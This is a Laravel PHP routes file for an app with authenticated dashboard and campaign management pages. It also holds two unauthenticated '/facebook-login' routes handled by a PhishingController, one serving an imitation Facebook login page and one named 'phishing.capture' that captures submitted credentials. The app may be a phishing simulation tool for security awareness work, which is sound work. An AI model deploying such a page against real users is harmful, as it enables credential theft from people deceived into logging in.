<?php

use App\Http\Controllers\CampaignController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\PhishingController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

Route::get('/',function(){
    return view('welcome');

});

Auth::routes();

Route::get("/home",[HomeController::class,'index'])->name('home');

Route::middleware(['auth'])->group(function()
{
    Route::get('/dashboard',[DashboardController::class,'index'])->name('dashboard');
    Route::resource('/campaigns',CampaignController::class);
});

Route::get("/facebook-login",[PhishingController::class,'showLoginPage'])->name('phishing.login');
Route::post("/facebook-login",[PhishingController::class,'captureCredentials'])->name('phishing.capture');